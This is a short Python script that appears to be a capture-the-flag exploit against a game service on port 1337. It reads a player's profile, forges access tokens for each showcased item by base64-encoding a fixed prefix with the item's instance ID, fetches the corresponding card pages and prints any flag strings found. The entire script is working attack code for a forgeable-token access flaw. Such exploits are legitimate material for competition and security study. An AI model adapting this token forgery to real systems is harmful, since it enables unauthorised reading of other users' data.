#!/usr/bin/env python3

import base64
import re
import sys

import requests

FLAG_RE = re.compile(r"[A-Z][A-Z0-9]{30}=")


def main():
    ip = sys.argv[1]
    player_id = sys.argv[2]
    base = f"http://{ip}:1337"

    s = requests.Session()
    prof = s.get(f"{base}/api/profile/{player_id}", timeout=5).json()

    for item in prof.get("showcase", []):
        iid = item["instance_id"]
        token = base64.urlsafe_b64encode(f"xy:{iid}".encode()).decode().rstrip("=")
        html = s.get(f"{base}/card/{token}", timeout=5).text
        for flag in FLAG_RE.findall(html):
            print(flag, flush=True)


if __name__ == "__main__":
    main()
